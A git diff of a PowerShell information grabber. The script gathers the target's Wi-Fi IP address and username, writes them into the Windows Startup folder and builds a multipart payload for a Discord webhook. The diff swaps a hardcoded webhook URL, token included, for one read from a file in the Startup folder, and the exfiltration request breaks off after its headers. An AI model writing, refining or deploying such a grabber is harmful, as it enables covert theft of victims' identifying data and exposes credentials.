@@ -1,19 +1,19 @@
 # None of the files created will be saved on the target's computer
 # TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead
 
-# Define the Discord webhook URL
-$DiscordWebhookURL = "https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh3CauMLSWlzSQCtBoL5UEzTfGasfXSdO4TCtBHSsRbEb6YWD"
-
 # Get the Wi-Fi IPv4 Address
 $IPAddress = (Get-NetIPAddress -InterfaceAlias "Wi-Fi" | Where-Object {$_.AddressFamily -eq "IPv4"}).IPAddress
-
 # Get the current user's username
 $Username = $env:USERNAME
 
 # Get the user's profile folder
 $UserProfileFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
-
 $StartupDirectory = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+# Define the path to the file containing the Discord webhook URL
+$DiscordWebhookURLFilePath = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\DiscordWebhookURL.txt"
+# Use Get-Content to read the file and store its content in a variable
+$DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFilePath
 
 # Create a text file in the user's startup folder
 $TextContent = "$IPAddress`n$Username"
@@ -26,7 +26,6 @@ $TextContent | Out-File -FilePath $TextFile
 # Create a multipart form-data payload
 $Boundary = [System.Guid]::NewGuid().ToString()
 $CRLF = "`r`n"
-
 $Payload = "--$Boundary$CRLF" +
     "Content-Disposition: form-data; name=`"content`"$CRLF$CRLF$Message$CRLF" +
     "--$Boundary$CRLF" +
@@ -34,7 +33,6 @@ $Payload = "--$Boundary$CRLF" +
     "Content-Type: application/octet-stream$CRLF$CRLF" +
     (Get-Content -Path $TextFile) + $CRLF +
     "--$Boundary--"
-
 # Set the headers for the request
 $Headers = @{
     "Content-Type" = "multipart/form-data; boundary=$Boundary"
